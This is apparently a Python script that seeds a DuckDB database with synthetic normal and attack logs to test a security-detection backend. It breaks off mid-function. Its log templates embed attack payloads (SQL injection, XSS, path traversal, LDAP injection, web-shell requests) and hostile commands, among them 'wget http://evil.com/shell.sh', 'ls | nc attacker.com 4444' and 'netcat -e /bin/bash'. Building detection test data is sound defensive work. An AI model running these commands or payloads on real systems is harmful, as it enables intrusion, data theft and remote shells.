import sys
import os
import time
import random
import json
import uuid
import duckdb
from datetime import datetime, timedelta

# Add backend to path to import models if needed, but we'll use direct SQL for simplicity and speed
sys.path.append(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'backend'))

DB_PATH = "data/duckdb/logs.db"

# Sample data for generation
HOSTS = [f"server-{i:02d}" for i in range(1, 21)]
APPS = ["sshd", "nginx", "apache2", "mysql", "postgresql", "kernel", "systemd", "cron", "auth"]
USERS = ["root", "admin", "user", "deploy", "backup", "guest", "ubuntu", "ec2-user"]
# IP ranges matching network configurations
IPS = (
    [f"192.168.1.{i}" for i in range(1, 255)] +  # Corporate network
    [f"10.0.0.{i}" for i in range(1, 255)] +      # DMZ network
    [f"192.168.100.{i}" for i in range(1, 50)] +  # IoT network
    [f"192.168.200.{i}" for i in range(1, 50)]    # Guest network
)

# Network Domain Configuration
# Define different network domains for multi-tenant filtering
NETWORKS = {
    "corporate": {
        "name": "Corporate Network",
        "hosts": [f"server-{i:02d}" for i in range(1, 11)],  # server-01 to server-10
        "ip_ranges": ["192.168.1."],  # IP prefix
    },
    "dmz": {
        "name": "DMZ Network",
        "hosts": [f"server-{i:02d}" for i in range(11, 15)],  # server-11 to server-14
        "ip_ranges": ["10.0.0."],
    },
    "iot": {
        "name": "IoT Network",
        "hosts": [f"server-{i:02d}" for i in range(15, 17)],  # server-15 to server-16
        "ip_ranges": ["192.168.100."],
    },
    "guest": {
        "name": "Guest Network",
        "hosts": [f"server-{i:02d}" for i in range(17, 19)],  # server-17 to server-18
        "ip_ranges": ["192.168.200."],
    },
    "public": {
        "name": "Public Network",
        "hosts": [f"server-{i:02d}" for i in range(19, 21)],  # server-19 to server-20
        "ip_ranges": [],  # External/various IPs
    }
}

# Create reverse mapping: host -> network_id
HOST_TO_NETWORK = {}
for network_id, network_config in NETWORKS.items():
    for host in network_config["hosts"]:
        HOST_TO_NETWORK[host] = network_id

def get_network_id(host, ip=None):
    """
    Determine network_id based on host or IP address
    
    Args:
        host: Hostname
        ip: IP address (optional)
    
    Returns:
        network_id string
    """
    # First try host-based lookup
    if host in HOST_TO_NETWORK:
        return HOST_TO_NETWORK[host]
    
    # If IP is provided, try IP-based lookup
    if ip:
        for network_id, network_config in NETWORKS.items():
            for ip_prefix in network_config["ip_ranges"]:
                if ip.startswith(ip_prefix):
                    return network_id
        # If no specific match and it's an external IP, classify as public
        if not any(ip.startswith(prefix) for prefix in ["192.168.", "10.0.", "172.16."]):
            return "public"
    
    # Default fallback
    return "corporate"


# Include some blocked IPs from our threat intel
BLOCKED_IPS = [
    "192.0.2.1", "198.51.100.1", "203.0.113.1", 
    "185.220.101.1", "185.220.101.2", "45.142.212.61"
]

EXTERNAL_IPS = [f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}" for _ in range(50)]

# Malicious domains for threat intel
MALICIOUS_DOMAINS = [
    "evil.com", "malware.net", "phishing.org", "c2-server.com", "attacker.io"
]

# Malicious hashes
MALICIOUS_HASHES = [
    "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
    "a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456",
    "5d41402abc4b2a76b9719d911017c592"
]

# Normal messages (60% of traffic)
NORMAL_MESSAGES = {
    "sshd": [
        "Accepted publickey for {user} from {ip} port {port} ssh2",
        "Disconnected from {ip} port {port}",
        "Connection closed by {ip} port {port}",
        "Session opened for user {user} by (uid=0)"
    ],
    "nginx": [
        '{ip} - - [{timestamp}] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0"',
        '{ip} - - [{timestamp}] "GET /api/status HTTP/1.1" 200 124 "-" "curl/7.68.0"',
        '{ip} - - [{timestamp}] "GET /static/style.css HTTP/1.1" 200 1456 "http://example.com" "Mozilla/5.0"',
        '{ip} - - [{timestamp}] "POST /api/data HTTP/1.1" 201 45 "-" "axios/0.21.1"'
    ],
    "apache2": [
        '{ip} - - [{timestamp}] "GET /index.html HTTP/1.1" 200 2326',
        '{ip} - - [{timestamp}] "GET /images/logo.png HTTP/1.1" 200 5432',
        '{ip} - - [{timestamp}] "POST /contact HTTP/1.1" 200 156'
    ],
    "kernel": [
        "UFW ALLOW: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=80",
        "systemd[1]: Started Session {pid} of user {user}",
    ],
    "mysql": [
        "[Note] Access granted for user '{user}'@'{ip}'",
        "[Note] Query executed successfully for user '{user}'",
    ]
}

# Attack patterns for signature detection
ATTACK_MESSAGES = {
    # SQL Injection attacks
    "sql_injection": [
        r'{ip} - - [{timestamp}] "GET /search?q=\' OR 1=1-- HTTP/1.1" 200 1234',
        r'{ip} - - [{timestamp}] "POST /login HTTP/1.1" 401 124 "username=admin\' OR \'1\'=\'1&password=test"',
        '{ip} - - [{timestamp}] "GET /product?id=1 UNION SELECT * FROM users-- HTTP/1.1" 500 234',
        '{ip} - - [{timestamp}] "GET /api/user?id=1; DROP TABLE users;-- HTTP/1.1" 500 89',
    ],
    
    # XSS attacks
    "xss": [
        '{ip} - - [{timestamp}] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 456',
        '{ip} - - [{timestamp}] "POST /comment HTTP/1.1" 200 234 "content=<img src=x onerror=alert(1)>"',
        '{ip} - - [{timestamp}] "GET /page?name=<svg/onload=alert(document.cookie)> HTTP/1.1" 200 567',
    ],
    
    # SSH Brute Force
    "ssh_brute_force": [
        "Failed password for {user} from {ip} port {port} ssh2",
        "Failed password for invalid user admin from {ip} port {port} ssh2",
        "Invalid user {user} from {ip}",
        "Failed password for root from {ip} port {port} ssh2",
        "Authentication failure for {user} from {ip}",
    ],
    
    # Path Traversal
    "path_traversal": [
        '{ip} - - [{timestamp}] "GET /download?file=../../../etc/passwd HTTP/1.1" 403 124',
        r'{ip} - - [{timestamp}] "GET /files?path=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1" 403 89',
        '{ip} - - [{timestamp}] "GET /view?page=....//....//....//etc/shadow HTTP/1.1" 403 67',
    ],
    
    # Command Injection
    "command_injection": [
        '{ip} - - [{timestamp}] "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 500 234',
        '{ip} - - [{timestamp}] "POST /exec HTTP/1.1" 500 123 "cmd=ls | nc attacker.com 4444"',
        '{ip} - - [{timestamp}] "GET /run?cmd=$(whoami) HTTP/1.1" 500 89',
    ],
    
    # Port Scanning
    "port_scan": [
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=22",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=23",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=3389",
        "UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={port} DPT=445",
    ],
    
    # Malware/Backdoor
    "malware": [
        "Process mimikatz.exe detected on {host}",
        "Suspicious file hash detected: ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
        "Cobalt Strike beacon detected from {ip}",
        "Reverse shell connection attempt to {ip}:4444",
    ],
    
    # Privilege Escalation
    "privilege_escalation": [
        "sudo: {user} : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
        "User {user} attempted to execute /etc/shadow",
        "SUID binary /usr/bin/passwd executed by {user}",
    ],
    
    # Blocked IP connections
    "blocked_ip": [
        "Connection attempt from blocked IP {ip}",
        "Firewall blocked connection from {ip} to port {port}",
        "Denied access from known malicious IP {ip}",
    ],
    
    # Web Shell
    "web_shell": [
        '{ip} - - [{timestamp}] "POST /uploads/shell.php HTTP/1.1" 200 45 "cmd=whoami"',
        '{ip} - - [{timestamp}] "GET /wp-content/uploads/c99.php?cmd=ls HTTP/1.1" 200 234',
    ],
    
    # LDAP Injection
    "ldap_injection": [
        r'{ip} - - [{timestamp}] "POST /auth HTTP/1.1" 401 123 "username=*)(uid=*))(|(uid=*&password=test"',
    ],
}

# State tracking for pattern generation
class SeederState:
    def __init__(self):
        self.brute_force_ips = {}  # Track failed logins per IP
        self.user_profiles = {}  # Track user login patterns
        self.port_scan_ips = {}  # Track port scanning
        self.beaconing_ips = {}  # Track beaconing patterns
        self.file_access_count = {}  # Track rapid file access
        self.command_sequences = {}  # Track suspicious commands
        self.lateral_movement_users = {}  # Track lateral movement
        self.data_transfer_ips = {}  # Track data exfiltration
        self.dns_query_ips = {}  # Track DNS tunneling
        self.ddos_targets = {}  # Track DDoS targets
        self.minute_counter = 0

state = SeederState()


def initialize_schema(conn):
    """Initialize database schema - creates tables if they don't exist"""
    # Logs table
    conn.execute("""
        CREATE TABLE IF NOT EXISTS logs (
            id VARCHAR PRIMARY KEY,
            timestamp VARCHAR,
            raw VARCHAR,
            appname VARCHAR,
            file VARCHAR,
            host VARCHAR,
            hostname VARCHAR,
            message VARCHAR,
            procid INTEGER,
            source_type VARCHAR,
            network_id VARCHAR,
            normalized JSON,
            metadata JSON,
            ingestion_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    
    # Create indexes
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_logs_timestamp 
        ON logs(timestamp)
    """)
    
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_logs_host 
        ON logs(host)
    """)
    
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_logs_appname 
        ON logs(appname)
    """)
    
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_logs_ingestion_time 
        ON logs(ingestion_time)
    """)
    
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_logs_network_id 
        ON logs(network_id)
    """)
    
    # Alerts table (for API use, but create it here too)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS alerts (
            id VARCHAR PRIMARY KEY,
            log_id VARCHAR,
            alert_type VARCHAR,
            detection_method VARCHAR,
            severity VARCHAR,
            description VARCHAR,
            metadata JSON,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            acknowledged BOOLEAN DEFAULT FALSE,
            priority_score DOUBLE,
            source_ip VARCHAR,
            dest_ip VARCHAR,
            user VARCHAR,
            host VARCHAR
        )
    """)
    
    # Create index on alerts timestamp
    conn.execute("""
        CREATE INDEX IF NOT EXISTS idx_alerts_created_at 
        ON alerts(created_at)
    """)
    
    # Threat intel table
    conn.execute("""
        CREATE TABLE IF NOT EXISTS threat_intel (
            id VARCHAR PRIMARY KEY,
            indicator_type VARCHAR,
            indicator_value VARCHAR,
            threat_type VARCHAR,
            confidence DOUBLE,
            source VARCHAR,
            metadata JSON,
            created_at TIMESTAMP,
            expires_at TIMESTAMP
        )
    """)
    
    # Seed threat intel with blocked IPs and malicious domains
    for ip in BLOCKED_IPS:
        try:
            conn.execute("""
                INSERT OR IGNORE INTO threat_intel 
                (id, indicator_type, indicator_value, threat_type, confidence, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (str(uuid.uuid4()), "ip", ip, "malicious_ip", 0.9, "blocked_ips.txt", datetime.now()))
        except:
            pass
    
    for domain in MALICIOUS_DOMAINS:
        try:
            conn.execute("""
                INSERT OR IGNORE INTO threat_intel 
                (id, indicator_type, indicator_value, threat_type, confidence, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (str(uuid.uuid4()), "domain", domain, "malicious_domain", 0.85, "threat_feed", datetime.now()))
        except:
            pass
    
    for hash_val in MALICIOUS_HASHES:
        try:
            conn.execute("""
                INSERT OR IGNORE INTO threat_intel 
                (id, indicator_type, indicator_value, threat_type, confidence, source, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (str(uuid.uuid4()), "hash", hash_val, "malware", 0.95, "hash_repo", datetime.now()))
        except:
            pass


def connect_db():
    """Connect to DuckDB database with retry logic for lock conflicts"""
    import time
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    
    # Retry logic for database locks
    max_retries = 5
    retry_delay = 0.5
    
    for attempt in range(max_retries):
        try:
            conn = duckdb.connect(DB_PATH)
            # Initialize schema on first connection
            initialize_schema(conn)
            return conn
        except Exception as e:
            if "lock" in str(e).lower() or "conflicting" in str(e).lower():
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (attempt + 1))  # Exponential backoff
                    continue
                else:
                    print(f"\n⚠️  Database lock conflict. Another process is using the database.")
                    print(f"   Solution: Stop the API backend temporarily while seeding, or seed when API is not running.")
                    raise
            else:
                raise


def create_log_entry(app, host, ip, user, port, pid, message, normalized_extra=None):
    """Create a log entry dictionary"""
    log_id = str(uuid.uuid4())
    timestamp = datetime.now().isoformat()
    
    # Determine network_id based on host and IP
    network_id = get_network_id(host, ip)
    
    # Normalized data
    normalized = {
        "timestamp": timestamp,
        "appname": app,
        "host": host,
        "message": message,
        "source_ip": ip,
        "user": user if app in ["sshd", "auth"] else None
    }
    
    # Add extra normalized fields
    if normalized_extra:
        normalized.update(normalized_extra)
    
    return {
        "id": log_id,
        "timestamp": timestamp,
        "raw": f"{timestamp} {host} {app}[{pid}]: {message}",
        "appname": app,
        "file": f"/var/log/{app}.log",
        "host": host,
        "hostname": host,
        "message": message,
        "procid": pid,
        "source_type": "file",
        "network_id": network_id,
        "normalized": json.dumps(normalized),
        "metadata": json.dumps({"environment": "production", "region": "us-east-1"}),
        "ingestion_time": datetime.now()
    }



def generate_signature_detection_log():
    """Generate logs for signature detection (SQL injection, XSS, etc.)"""
    attack_type = random.choice(["sql_injection", "xss", "path_traversal", "command_injection", "web_shell"])
    messages = ATTACK_MESSAGES[attack_type]
    
    ip = random.choice(EXTERNAL_IPS)
    app = random.choice(["nginx", "apache2"])
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    template = random.choice(messages)
    message = template.format(
        user=user, ip=ip, port=port, pid=pid, timestamp=timestamp_str, host=host
    )
    
    return create_log_entry(app, host, ip, user, port, pid, message)


def generate_threat_intel_log():
    """Generate logs that match threat intelligence indicators"""
    indicator_type = random.choice(["ip", "domain", "hash"])
    
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    normalized_extra = {}
    
    if indicator_type == "ip":
        ip = random.choice(BLOCKED_IPS)
        message = f"Connection attempt from {ip} to port {port}"
        app = "kernel"
    elif indicator_type == "domain":
        domain = random.choice(MALICIOUS_DOMAINS)
        ip = random.choice(EXTERNAL_IPS)
        timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
        message = f'{ip} - - [{timestamp_str}] "GET / HTTP/1.1" 200 612 "http://{domain}" "Mozilla/5.0"'
        app = "nginx"
        normalized_extra["domain"] = domain
    else:  # hash
        hash_val = random.choice(MALICIOUS_HASHES)
        ip = random.choice(IPS)  # Use internal IP for hash detection
        message = f"Suspicious file hash detected: {hash_val}"
        app = "systemd"
        normalized_extra["file_hash"] = hash_val
    
    return create_log_entry(app, host, ip, user, port, pid, message, normalized_extra)


def generate_heuristic_brute_force_log():
    """Generate brute force pattern: multiple failed logins followed by success"""
    ip = random.choice(EXTERNAL_IPS)
    user = random.choice(USERS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    # Track failed logins
    key = (ip, user)
    if key not in state.brute_force_ips:
        state.brute_force_ips[key] = 0
    
    state.brute_force_ips[key] += 1
    
    # Generate 5-10 failed logins, then one success
    if state.brute_force_ips[key] < random.randint(5, 10):
        message = f"Failed password for {user} from {ip} port {port} ssh2"
        return create_log_entry("sshd", host, ip, user, port, pid, message)
    else:
        # Success after failures
        message = f"Accepted password for {user} from {ip} port {port} ssh2"
        state.brute_force_ips[key] = 0  # Reset
        return create_log_entry("sshd", host, ip, user, port, pid, message)


def generate_heuristic_privilege_escalation_log():
    """Generate privilege escalation after login"""
    user = random.choice(USERS)
    host = random.choice(HOSTS)
    ip = random.choice(IPS)
    pid = random.randint(1000, 99999)
    
    # First login, then privilege escalation
    if random.random() < 0.5:
        message = f"Accepted publickey for {user} from {ip} port 22 ssh2"
        return create_log_entry("sshd", host, ip, user, 22, pid, message)
    else:
        # Privilege escalation shortly after
        message = f"sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash"
        return create_log_entry("auth", host, ip, user, 0, pid, message)


def generate_heuristic_lateral_movement_log():
    """Generate lateral movement: accessing multiple hosts"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    
    if user not in state.lateral_movement_users:
        state.lateral_movement_users[user] = []
    
    # Access different hosts
    available_hosts = [h for h in HOSTS if h not in state.lateral_movement_users[user]]
    if not available_hosts:
        state.lateral_movement_users[user] = []  # Reset
        available_hosts = HOSTS
    
    host = random.choice(available_hosts)
    state.lateral_movement_users[user].append(host)
    
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
    
    return create_log_entry("sshd", host, ip, user, port, pid, message)


def generate_heuristic_data_exfiltration_log():
    """Generate large data transfer (potential exfiltration)"""
    ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    # Large data transfer (100MB+)
    bytes_transferred = random.randint(100000000, 500000000)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    message = f'{ip} - - [{timestamp_str}] "GET /download/largefile.zip HTTP/1.1" 200 {bytes_transferred}'
    
    normalized_extra = {"bytes": bytes_transferred, "dest_ip": ip, "dest_ip_type": "external"}
    return create_log_entry("nginx", host, ip, user, port, pid, message, normalized_extra)


def generate_heuristic_off_hours_log():
    """Generate off-hours activity (22:00-06:00)"""
    # Force off-hours by manipulating timestamp
    now = datetime.now()
    if 6 <= now.hour < 22:
        # Adjust to off-hours
        hour = random.choice([22, 23, 0, 1, 2, 3, 4, 5])
        timestamp = now.replace(hour=hour, minute=random.randint(0, 59))
    else:
        timestamp = now
    
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
    
    log = create_log_entry("sshd", host, ip, user, port, pid, message)
    log["timestamp"] = timestamp.isoformat()
    return log


def generate_heuristic_rapid_file_access_log():
    """Generate rapid file access pattern"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    key = (user, ip)
    if key not in state.file_access_count:
        state.file_access_count[key] = 0
    
    state.file_access_count[key] += 1
    
    file_path = f"/home/{user}/file_{random.randint(1, 1000)}.txt"
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    message = f'{ip} - - [{timestamp_str}] "GET {file_path} HTTP/1.1" 200 1234'
    
    normalized_extra = {"resource": file_path, "action": "read"}
    return create_log_entry("nginx", host, ip, user, port, pid, message, normalized_extra)


def generate_heuristic_suspicious_commands_log():
    """Generate suspicious command sequence"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    pid = random.randint(1000, 99999)
    
    key = (user, ip)
    if key not in state.command_sequences:
        state.command_sequences[key] = []
    
    suspicious_commands = ["rm -rf /tmp", "chmod 777 /etc/passwd", "wget http://evil.com/shell.sh", 
                          "curl http://attacker.com/data", "nc -l -p 4444", "netcat -e /bin/bash"]
    
    cmd = random.choice(suspicious_commands)
    state.command_sequences[key].append(cmd)
    
    message = f"Command executed: {cmd} by user {user}"
    normalized_extra = {"action": "command_execution", "command": cmd}
    return create_log_entry("systemd", host, ip, user, 0, pid, message, normalized_extra)


def generate_behavioral_unusual_time_log():
    """Generate login at unusual time"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    # Unusual hour (outside 9-17)
    unusual_hour = random.choice([0, 1, 2, 3, 4, 5, 22, 23])
    now = datetime.now()
    timestamp = now.replace(hour=unusual_hour, minute=random.randint(0, 59))
    
    message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
    log = create_log_entry("sshd", host, ip, user, port, pid, message)
    log["timestamp"] = timestamp.isoformat()
    return log


def generate_behavioral_unusual_ip_log():
    """Generate login from unusual IP"""
    user = random.choice(USERS)
    # Use external IP (unusual for internal users)
    ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
    return create_log_entry("sshd", host, ip, user, port, pid, message)


def generate_behavioral_unusual_resource_log():
    """Generate access to unusual resource"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    # Unusual resource
    unusual_resources = ["/etc/shadow", "/root/.ssh/id_rsa", "/var/log/auth.log", "/etc/passwd"]
    resource = random.choice(unusual_resources)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    message = f'{ip} - - [{timestamp_str}] "GET {resource} HTTP/1.1" 200 1234'
    
    normalized_extra = {"resource": resource, "action": "read"}
    return create_log_entry("nginx", host, ip, user, port, pid, message, normalized_extra)


def generate_network_port_scan_log():
    """Generate port scanning activity"""
    ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    
    if ip not in state.port_scan_ips:
        state.port_scan_ips[ip] = []
    
    # Scan different ports
    port = random.randint(1, 65535)
    if port not in state.port_scan_ips[ip]:
        state.port_scan_ips[ip].append(port)
    
    message = f"UFW BLOCK: IN=eth0 OUT= SRC={ip} DST=192.168.1.1 PROTO=TCP SPT={random.randint(1024, 65535)} DPT={port}"
    normalized_extra = {"dest_port": port, "protocol": "tcp", "dest_ip": "192.168.1.1"}
    return create_log_entry("kernel", host, ip, None, port, random.randint(1000, 99999), message, normalized_extra)


def generate_network_ddos_log():
    """Generate DDoS attack pattern"""
    target_ip = random.choice(IPS[:5])  # Target specific IPs
    source_ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    port = random.randint(1, 65535)
    pid = random.randint(1000, 99999)
    
    if target_ip not in state.ddos_targets:
        state.ddos_targets[target_ip] = 0
    
    state.ddos_targets[target_ip] += 1
    
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    message = f'{source_ip} - - [{timestamp_str}] "GET / HTTP/1.1" 200 612'
    
    normalized_extra = {"dest_ip": target_ip, "dest_port": port, "protocol": "http"}
    return create_log_entry("nginx", host, source_ip, None, port, pid, message, normalized_extra)


def generate_network_beaconing_log():
    """Generate C2 beaconing (regular periodic connections)"""
    source_ip = random.choice(EXTERNAL_IPS)
    dest_ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    port = random.randint(8080, 8443)
    pid = random.randint(1000, 99999)
    
    key = (source_ip, dest_ip)
    if key not in state.beaconing_ips:
        state.beaconing_ips[key] = []
    
    state.beaconing_ips[key].append(datetime.now())
    
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    message = f'{source_ip} - - [{timestamp_str}] "GET /beacon HTTP/1.1" 200 45'
    
    normalized_extra = {"dest_ip": dest_ip, "dest_port": port, "protocol": "http"}
    return create_log_entry("nginx", host, source_ip, None, port, pid, message, normalized_extra)


def generate_network_dns_tunneling_log():
    """Generate DNS tunneling (excessive DNS queries)"""
    ip = random.choice(EXTERNAL_IPS)
    host = random.choice(HOSTS)
    pid = random.randint(1000, 99999)
    
    if ip not in state.dns_query_ips:
        state.dns_query_ips[ip] = 0
    
    state.dns_query_ips[ip] += 1
    
    domain = f"data{random.randint(1000, 9999)}.evil.com"
    message = f"DNS query for {domain} from {ip}"
    
    normalized_extra = {"protocol": "dns", "domain": domain}
    return create_log_entry("kernel", host, ip, None, 53, pid, message, normalized_extra)


def generate_anomaly_high_login_frequency_log():
    """Generate high login frequency (anomaly)"""
    user = random.choice(USERS)
    ip = random.choice(IPS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
    return create_log_entry("sshd", host, ip, user, port, pid, message)


def generate_anomaly_failed_login_spike_log():
    """Generate failed login spike (anomaly)"""
    ip = random.choice(EXTERNAL_IPS)
    user = random.choice(USERS)
    host = random.choice(HOSTS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    
    message = f"Failed password for {user} from {ip} port {port} ssh2"
    return create_log_entry("sshd", host, ip, user, port, pid, message)


def generate_rule_engine_mitre_log():
    """Generate logs matching MITRE ATT&CK rules"""
    rule_type = random.choice(["brute_force", "valid_accounts", "c2_protocol"])
    
    if rule_type == "brute_force":
        ip = random.choice(EXTERNAL_IPS)
        user = random.choice(USERS)
        host = random.choice(HOSTS)
        port = random.randint(1024, 65535)
        pid = random.randint(1000, 99999)
        message = f"Failed password for {user} from {ip} port {port} ssh2"
        return create_log_entry("sshd", host, ip, user, port, pid, message)
    elif rule_type == "valid_accounts":
        ip = random.choice(EXTERNAL_IPS)
        user = "root"  # Privileged user
        host = random.choice(HOSTS)
        port = random.randint(1024, 65535)
        pid = random.randint(1000, 99999)
        message = f"Accepted publickey for {user} from {ip} port {port} ssh2"
        normalized_extra = {"source_ip_type": "external", "user_type": "privileged"}
        return create_log_entry("sshd", host, ip, user, port, pid, message, normalized_extra)
    else:  # c2_protocol
        source_ip = random.choice(EXTERNAL_IPS)
        dest_ip = random.choice(EXTERNAL_IPS)
        host = random.choice(HOSTS)
        port = random.choice([8080, 8443, 4444])
        pid = random.randint(1000, 99999)
        timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
        message = f'{source_ip} - - [{timestamp_str}] "GET /c2 HTTP/1.1" 200 45'
        normalized_extra = {"dest_ip": dest_ip, "dest_port": port, "protocol": "http", "dest_ip_type": "external"}
        return create_log_entry("nginx", host, source_ip, None, port, pid, message, normalized_extra)


def generate_normal_log():
    """Generate a normal log entry"""
    app = random.choice(list(NORMAL_MESSAGES.keys()))
    host = random.choice(HOSTS)
    
    # Normal traffic uses internal IPs mostly
    if random.random() < 0.8:
        ip = random.choice(IPS)
    else:
        ip = random.choice(EXTERNAL_IPS)
    
    user = random.choice(USERS)
    port = random.randint(1024, 65535)
    pid = random.randint(1000, 99999)
    timestamp_str = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
    
    template = random.choice(NORMAL_MESSAGES[app])
    message = template.format(
        user=user, ip=ip, port=port, pid=pid, timestamp=timestamp_str
    )
    
    return create_log_entry(app, host, ip, user, port, pid, message)


def generate_log():
    """Generate a log - distributed across all detection methods"""
    state.minute_counter += 1
    
    # Distribute logs across detection methods over 10 minutes
    # Each method gets triggered multiple times
    
    rand = random.random()
    
    if rand < 0.10:  # 10% - Signature detection
        return generate_signature_detection_log()
    elif rand < 0.15:  # 5% - Threat intel
        return generate_threat_intel_log()
    elif rand < 0.25:  # 10% - Heuristic patterns
        heuristic_type = random.choice([
            "brute_force", "privilege_escalation", "lateral_movement", 
            "data_exfiltration", "off_hours", "rapid_file_access", "suspicious_commands"
        ])
        if heuristic_type == "brute_force":
            return generate_heuristic_brute_force_log()
        elif heuristic_type == "privilege_escalation":
            return generate_heuristic_privilege_escalation_log()
        elif heuristic_type == "lateral_movement":
            return generate_heuristic_lateral_movement_log()
        elif heuristic_type == "data_exfiltration":
            return generate_heuristic_data_exfiltration_log()
        elif heuristic_type == "off_hours":
            return generate_heuristic_off_hours_log()
        elif heuristic_type == "rapid_file_access":
            return generate_heuristic_rapid_file_access_log()
        else:  # suspicious_commands
            return generate_heuristic_suspicious_commands_log()
    elif rand < 0.35:  # 10% - Behavioral patterns
        behavioral_type = random.choice(["unusual_time", "unusual_ip", "unusual_resource"])
        if behavioral_type == "unusual_time":
            return generate_behavioral_unusual_time_log()
        elif behavioral_type == "unusual_ip":
            return generate_behavioral_unusual_ip_log()
        else:  # unusual_resource
            return generate_behavioral_unusual_resource_log()
    elif rand < 0.50:  # 15% - Network patterns
        network_type = random.choice(["port_scan", "ddos", "beaconing", "dns_tunneling"])
        if network_type == "port_scan":
            return generate_network_port_scan_log()
        elif network_type == "ddos":
            return generate_network_ddos_log()
        elif network_type == "beaconing":
            return generate_network_beaconing_log()
        else:  # dns_tunneling
            return generate_network_dns_tunneling_log()
    elif rand < 0.60:  # 10% - Anomaly patterns
        anomaly_type = random.choice(["high_login", "failed_spike"])
        if anomaly_type == "high_login":
            return generate_anomaly_high_login_frequency_log()
        else:  # failed_spike
            return generate_anomaly_failed_login_spike_log()
    elif rand < 0.65:  # 5% - Rule engine (MITRE)
        return generate_rule_engine_mitre_log()
    else:  # 35% - Normal traffic
        return generate_normal_log()


def seed_logs(batch_size=10, interval=1.0, duration_minutes=10):
    """Main seeder function - runs for specified duration"""
    print(f"Starting COMPREHENSIVE log seeder for {duration_minutes} minutes")
    print(f"Writing to {DB_PATH}")
    print(f"Batch size: {batch_size}, Interval: {interval}s")
    print(f"This seeder will generate logs to trigger ALL 7 detection methods:")
    print("  1. Signature Detection (SQL injection, XSS, etc.)")
    print("  2. Anomaly Detection (statistical anomalies)")
    print("  3. Heuristic Analysis (brute force, privilege escalation, etc.)")
